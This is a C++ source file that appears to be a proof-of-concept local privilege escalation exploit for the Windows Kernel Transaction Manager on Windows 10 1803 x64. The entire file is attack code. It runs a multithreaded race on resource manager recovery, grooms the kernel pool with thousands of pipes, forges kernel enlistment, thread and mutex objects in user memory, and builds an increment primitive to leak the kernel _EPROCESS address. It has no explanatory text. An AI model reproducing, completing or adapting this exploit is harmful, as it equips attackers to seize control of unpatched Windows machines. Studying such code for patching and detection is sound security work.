//target OS version: cn_windows_10_consumer_editions_version_1803_updated_march_2018_x64_dvd_12063766

#include <windows.h>
#include <ktmw32.h>
#include <stdio.h>
#include "obj.h"

#pragma comment(lib, "KtmW32.lib")

#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_SUCCESS 0x00000000

#define TRIGGER_ENLISTMENT_HANDLES 3000

#define NAMED_PIPE_COUNT1 8000
#define NAMED_PIPE_COUNT2 5000
#define KENLISTMENT_OBJ_SIZE 0x240
#define NAMED_PIPE_BUFFER_SIZE (KENLISTMENT_OBJ_SIZE - 0x48)

HANDLE hTM, hRM, hTx1;
HANDLE hTriggerArray[TRIGGER_ENLISTMENT_HANDLES];

HANDLE hReadPipe1[NAMED_PIPE_COUNT1], hWritePipe1[NAMED_PIPE_COUNT1];
HANDLE hReadPipe2[NAMED_PIPE_COUNT2], hWritePipe2[NAMED_PIPE_COUNT2];

HANDLE hRecovery, hSuspend, hCongest, hEnlistmentCount, hReleaseRMMutex;

BOOL blSuspend = TRUE;
BOOL blCongest = TRUE;
BOOL blStartCount = TRUE;
BOOL blCongestFinalize = FALSE;
BOOL blPoolSpary = FALSE;
ULONG EnlistmentCount = 0;

_KENLISTMENT_KERNEL_OBJ FakeEnlistment;
_KWAIT_BLOCK FakeWaitBlock;
_KWAIT_BLOCK FakeKProcessWaitBlock;
_KWAIT_BLOCK FakeKthreadWaitBlockList[2];
_KMUTANT FakeMutant;
_KTHREAD FakeKthread;
_KPROCESS FakeKprocess;
_KTRANSACTION FakeTransaction;

_KENLISTMENT_KERNEL_OBJ IncrementEnlistment;
_KWAIT_BLOCK IncrementWaitBlock;
_KWAIT_BLOCK IncrementKProcessWaitBlock;
_KWAIT_BLOCK IncrementKthreadWaitBlockList[2];
_KMUTANT IncrementMutant;
_KTHREAD IncrementKthread;
_KPROCESS IncrementKprocess;
_KTRANSACTION IncrementTransaction;

extern "C" NTSTATUS NTAPI NtQueryInformationResourceManager(HANDLE ResourceManagerHandle, RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass, PVOID ResourceManagerInformation, ULONG ResourceManagerInformationLength, PULONG ReturnLength);
extern "C" NTSTATUS NTAPI NtQueryInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);

VOID ReleaseRMMutex()
{
	for (;;)
	{
		if (FakeEnlistment.KENLISTMENT.Flags == 0x01)
		{
			Sleep(1000);
			FakeEnlistment.KENLISTMENT.Flags = 0x81;
		}
	}
}

VOID CreateReleaseRMMutexThread()
{
	DWORD ThreadId;

	hReleaseRMMutex = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReleaseRMMutex, NULL, CREATE_SUSPENDED, &ThreadId);
	ResumeThread(hReleaseRMMutex);
}

VOID NotificationCounts(VOID)
{
	BOOL bRet;
	ULONG ReturnLength;
	TRANSACTION_NOTIFICATION notification;

	for (;;)
	{
		if (!blStartCount)
		{
			bRet = GetNotificationResourceManager(hRM, &notification, 1024, INFINITE, &ReturnLength);
			if (!bRet)
			{
				continue;
			}

			if (notification.TransactionNotification == TRANSACTION_NOTIFY_PREPREPARE)
			{
				EnlistmentCount++;
			}
		}
	}
}

VOID PoolFengShui()
{
	BYTE szTemp[NAMED_PIPE_BUFFER_SIZE];

	for (int i = 0; i < NAMED_PIPE_COUNT1; i++)
	{
		CreatePipe(&hReadPipe1[i], &hWritePipe1[i], NULL, sizeof(szTemp));
	}

	for (int i = 0; i < NAMED_PIPE_COUNT2; i++)
	{
		CreatePipe(&hReadPipe2[i], &hWritePipe2[i], NULL, sizeof(szTemp));
	}

	for (int i = 0; i < NAMED_PIPE_COUNT1 - NAMED_PIPE_COUNT2; i++)
	{
		WriteFile(hWritePipe1[i], szTemp, sizeof(szTemp), NULL, NULL);
	}

	for (int i = 0, j = NAMED_PIPE_COUNT1 - NAMED_PIPE_COUNT2; i < NAMED_PIPE_COUNT2; i++, j++)
	{
		WriteFile(hWritePipe1[j], szTemp, sizeof(szTemp), NULL, NULL);
		WriteFile(hWritePipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
	}

	for (int i = 0; i < NAMED_PIPE_COUNT2; i++)
	{
		ReadFile(hReadPipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
	}
}

VOID SetFakeKernelObject()
{
	memset(&FakeEnlistment, 0x00, sizeof(FakeEnlistment));
	memset(&FakeWaitBlock, 0x00, sizeof(FakeWaitBlock));
	memset(&FakeKProcessWaitBlock, 0x00, sizeof(FakeKProcessWaitBlock));
	memset(&FakeMutant, 0x00, sizeof(FakeMutant));
	memset(&FakeKthread, 0x00, sizeof(FakeKthread));
	memset(&FakeKprocess, 0x00, sizeof(FakeKprocess));
	memset(FakeKthreadWaitBlockList, 0x00, sizeof(FakeKthreadWaitBlockList));
	memset(&FakeTransaction, 0x00, sizeof(FakeTransaction));

	memset(&IncrementEnlistment, 0x00, sizeof(IncrementEnlistment));
	memset(&IncrementWaitBlock, 0x00, sizeof(IncrementWaitBlock));
	memset(&IncrementKProcessWaitBlock, 0x00, sizeof(IncrementKProcessWaitBlock));
	memset(&IncrementMutant, 0x00, sizeof(IncrementMutant));
	memset(&IncrementKthread, 0x00, sizeof(IncrementKthread));
	memset(&IncrementKprocess, 0x00, sizeof(IncrementKprocess));
	memset(IncrementKthreadWaitBlockList, 0x00, sizeof(IncrementKthreadWaitBlockList));
	memset(&IncrementTransaction, 0x00, sizeof(IncrementTransaction));

	FakeEnlistment.Reverse1 = 0x10098;
	FakeEnlistment.Reverse2 = 0x10098;

	FakeEnlistment.KENLISTMENT.Mutex.Header.Type = 0x2;
	FakeEnlistment.KENLISTMENT.Mutex.Header.SignalState = 1;

	FakeWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY*)&FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
	FakeWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY*)&FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
	FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink = (_LIST_ENTRY*)&FakeWaitBlock.WaitListEntry.Flink;
	FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Blink = (_LIST_ENTRY*)&FakeWaitBlock.WaitListEntry.Flink;
	FakeEnlistment.KENLISTMENT.State = KEnlistmentCommitted;

	FakeEnlistment.KENLISTMENT.Flags = 0x81;
	FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY*)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
	FakeEnlistment.KENLISTMENT.Transaction = &FakeTransaction;
	FakeTransaction.State = KTransactionPrepared;

	FakeWaitBlock.WaitType = 0x3;
	FakeWaitBlock.Object = &FakeMutant;
	FakeMutant.Header.Type = 0x3;
	FakeWaitBlock.Thread = &FakeKthread;

	FakeKthread.State = 5;
	FakeKthread.WaitRegister.Flags = 1;
	FakeKthread.Queue = 0;

	FakeKthread.WaitBlockCount = 1;
	FakeKthread.WaitBlockList = FakeKthreadWaitBlockList;
	FakeKthread.ApcState.Process = &FakeKprocess;
	FakeKthreadWaitBlockList[0].BlockState = 6;

	FakeKprocess.StackCount.Value = 7;

	FakeKProcessWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY*)&FakeKprocess.ReadyListHead.Flink;
	FakeKProcessWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY*)&FakeKprocess.ReadyListHead.Flink;
	FakeKprocess.ReadyListHead.Flink = (_LIST_ENTRY*)&FakeKProcessWaitBlock.WaitListEntry.Flink;
	FakeKprocess.ReadyListHead.Blink = (_LIST_ENTRY*)&FakeKProcessWaitBlock.WaitListEntry.Flink;
}

VOID Recovery(VOID)
{
	GUID Guid;
	BYTE szTemp[NAMED_PIPE_BUFFER_SIZE];

	PoolFengShui();
	SetFakeKernelObject();

	for (;;)
	{
		CoCreateGuid(&Guid);

		hTM = CreateTransactionManager(NULL, NULL, TRANSACTION_MANAGER_VOLATILE, 0);
		hRM = CreateResourceManager(NULL, &Guid, RESOURCE_MANAGER_VOLATILE, hTM, NULL);
		RecoverResourceManager(hRM);

		hTx1 = CreateTransaction(NULL, 0, 0, 0, 0, 0, (LPWSTR)L"Example1");
		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			hTriggerArray[i] = CreateEnlistment(NULL, hRM, hTx1, 0x39ffff0f, 0, NULL);
		}
		CommitTransactionAsync(hTx1);
		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			PrePrepareComplete(hTriggerArray[i], NULL);
		}
		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			PrepareComplete(hTriggerArray[i], NULL);
		}

		Sleep(100);
		blSuspend = FALSE;
		blCongest = FALSE;
		blStartCount = FALSE;
		RecoverResourceManager(hRM);

		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			CommitComplete(hTriggerArray[i], NULL);
			CloseHandle(hTriggerArray[i]);
		}

		if (blPoolSpary)
		{
			for (int i = 0; i < 1000; i++)
			{
				ReadFile(hReadPipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
			}
		}
		blPoolSpary = FALSE;

		CloseHandle(hTx1);
		CloseHandle(hRM);
		CloseHandle(hTM);
	}
}

VOID Suspend(VOID)
{
	VOID* pThreadInformation = NULL;
	BYTE szTemp[NAMED_PIPE_BUFFER_SIZE];

	pThreadInformation = new BYTE[0x100];
	memset(szTemp, 0x41, sizeof(szTemp));

	for (;;)
	{
		if (!blSuspend)
		{
			do
			{
				SuspendThread(hRecovery);
			} while (NtQueryInformationThread(hRecovery, ThreadLastSystemCall, pThreadInformation, 0x10, NULL) != STATUS_SUCCESS);

			blCongest = TRUE;
			blSuspend = TRUE;
			blStartCount = TRUE;

			if (EnlistmentCount != 0)
			{
				for (int i = EnlistmentCount - 3; i < EnlistmentCount + 3; i++)
				{
					CommitComplete(hTriggerArray[i], NULL);
					CloseHandle(hTriggerArray[i]);
				}
			}

			*(PULONG64)(szTemp + 0xA8) = (ULONG64)(FakeEnlistment.KENLISTMENT.NextSameRm.Flink);
			for (int i = 0; i < 1000; i++)
			{
				WriteFile(hWritePipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
			}
			blPoolSpary = TRUE;
			EnlistmentCount = 0;

			do
			{

			} while (ResumeThread(hRecovery) > 0);
		}
	}
}

VOID Congest(VOID)
{
	RESOURCEMANAGER_BASIC_INFORMATION* pRMBasicInfo = NULL;

	pRMBasicInfo = (RESOURCEMANAGER_BASIC_INFORMATION*)new BYTE[sizeof(RESOURCEMANAGER_BASIC_INFORMATION) + 0x1000];
	for (;;)
	{
		if (!blCongest)
		{
			NtQueryInformationResourceManager(hRM, ResourceManagerBasicInformation, pRMBasicInfo, 0x40, NULL);
			blCongestFinalize = TRUE;
		}
	}
}

VOID IncrementPrimitive(PVOID IncrementAddr, ULONG IncrementTimes)
{
	for (int i = 0; i < IncrementTimes; i++)
	{
		IncrementEnlistment.Reverse1 = 0x10098;
		IncrementEnlistment.Reverse2 = 0x10098;

		IncrementEnlistment.KENLISTMENT.Mutex.Header.Type = 0x2;
		IncrementEnlistment.KENLISTMENT.Mutex.Header.SignalState = 1;

		IncrementWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY*)&IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
		IncrementWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY*)&IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
		IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink = (_LIST_ENTRY*)&IncrementWaitBlock.WaitListEntry.Flink;
		IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Blink = (_LIST_ENTRY*)&IncrementWaitBlock.WaitListEntry.Flink;
		IncrementEnlistment.KENLISTMENT.State = KEnlistmentCommitted;

		IncrementEnlistment.KENLISTMENT.Flags = 0x81;
		IncrementEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY*)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
		IncrementEnlistment.KENLISTMENT.Transaction = &IncrementTransaction;
		IncrementTransaction.State = KTransactionPrepared;

		IncrementWaitBlock.WaitType = 0x3;
		IncrementWaitBlock.Object = &IncrementMutant;
		IncrementMutant.Header.Type = 0x3;
		IncrementWaitBlock.Thread = &IncrementKthread;

		IncrementKthread.State = 5;
		IncrementKthread.WaitRegister.Flags = 1;
		IncrementKthread.Queue = (_DISPATCHER_HEADER*)((ULONG64)IncrementAddr - 0x28);

		IncrementKthread.WaitBlockCount = 1;
		IncrementKthread.WaitBlockList = IncrementKthreadWaitBlockList;
		IncrementKthread.ApcState.Process = &IncrementKprocess;
		IncrementKthreadWaitBlockList[0].BlockState = 6;

		IncrementKprocess.StackCount.Value = 7;

		IncrementKProcessWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY*)&IncrementKprocess.ReadyListHead.Flink;
		IncrementKProcessWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY*)&IncrementKprocess.ReadyListHead.Flink;
		IncrementKprocess.ReadyListHead.Flink = (_LIST_ENTRY*)&IncrementKProcessWaitBlock.WaitListEntry.Flink;
		IncrementKprocess.ReadyListHead.Blink = (_LIST_ENTRY*)&IncrementKProcessWaitBlock.WaitListEntry.Flink;

		IncrementEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY*)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
		FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY*)&IncrementEnlistment.KENLISTMENT.NextSameRm.Flink;

		for (;;)
		{
			if (IncrementEnlistment.KENLISTMENT.Flags == 0x01)
			{
				break;
			}
		}

		FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY*)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
		FakeEnlistment.KENLISTMENT.Flags = 0x81;
		for (;;)
		{
			Sleep(50);
			if (FakeEnlistment.KENLISTMENT.Flags == 0x01)
			{
				break;
			}
		}
	}
}

VOID ElevationPrivilege(VOID)
{
	_KRESOURCEMANAGER* pKResourceManager = NULL;
	RESOURCEMANAGER_BASIC_INFORMATION* pRMBasicInfo = NULL;
	BYTE* pReadData = NULL;
	_KMUTANT* pKmutant = NULL;
	_KTHREAD* pKthread = NULL;
	BYTE IncrementArray[8];
	ULONG64 IncrementAddr;

	for (;;)
	{
		if (FakeEnlistment.KENLISTMENT.Mutex.OwnerThread != 0 && FakeEnlistment.KENLISTMENT.Flags == 0x01)
		{
			break;
		}
	}

	pKthread = CONTAINING_RECORD(FakeEnlistment.KENLISTMENT.Mutex.MutantListEntry.Flink, _KTHREAD, MutantListHead);
	*(ULONG64*)IncrementArray = (ULONG64)(&pKthread->ApcState) + 0x20;
	printf("pKthread->ApcState Addr: %llX\n", *(ULONG64*)IncrementArray);

	pKmutant = CONTAINING_RECORD(FakeEnlistment.KENLISTMENT.Mutex.MutantListEntry.Blink, _KMUTANT, MutantListEntry);
	pKResourceManager = CONTAINING_RECORD(pKmutant, _KRESOURCEMANAGER, Mutex);

	for (int i = 0; i < 8; i++)
	{
		IncrementAddr = (ULONG64)(&pKResourceManager->Description.Buffer) + i;
		IncrementPrimitive((PVOID)IncrementAddr, IncrementArray[i]);
	}

	IncrementAddr = (ULONG64)(&pKResourceManager->Description.Length);
	IncrementPrimitive((PVOID)IncrementAddr, 0x8);

	pRMBasicInfo = (RESOURCEMANAGER_BASIC_INFORMATION*)new BYTE[sizeof(RESOURCEMANAGER_BASIC_INFORMATION) + 0x1000];
	CreateReleaseRMMutexThread();
	NtQueryInformationResourceManager(hRM, ResourceManagerBasicInformation, pRMBasicInfo, 0x40, NULL);
	TerminateThread(hReleaseRMMutex, 0);

	pReadData = (BYTE*)pRMBasicInfo->Description;
	printf("_EPROCESS Addr: %llX\n", *(ULONG64*)pReadData);
}

int main()
{
	DWORD dwRecoverThreadId;
	DWORD dwSuspendThreadId;
	DWORD dwCongestThreadId;
	DWORD dwEnlistmentCountThreadId;

	hSuspend = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Suspend, NULL, CREATE_SUSPENDED, &dwSuspendThreadId);
	if (SetThreadAffinityMask(hSuspend, 0x00000002) == 0)
	{
		printf("bind hSuspend to cpu fail, error: %d\n", GetLastError());
	}
	ResumeThread(hSuspend);

	hEnlistmentCount = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NotificationCounts, NULL, CREATE_SUSPENDED, &dwEnlistmentCountThreadId);
	if (SetThreadAffinityMask(hEnlistmentCount, 0x00000004) == 0)
	{
		printf("bind hSuspend to cpu fail, error: %d\n", GetLastError());
	}
	ResumeThread(hEnlistmentCount);

	hRecovery = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Recovery, NULL, CREATE_SUSPENDED, &dwRecoverThreadId);
	if (SetThreadAffinityMask(hRecovery, 0x00000001) == 0)
	{
		printf("bind hRace to cpu fail, error: %d\n", GetLastError());
	}
	ResumeThread(hRecovery);

	hCongest = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Congest, NULL, CREATE_SUSPENDED, &dwCongestThreadId);
	if (SetThreadAffinityMask(hCongest, 0x00000008) == 0)
	{
		printf("bind hCongest to cpu fail, error: %d\n", GetLastError());
	}
	SetThreadPriority(hCongest, THREAD_PRIORITY_ABOVE_NORMAL);
	ResumeThread(hCongest);

	system("pause");
	return 0;
}
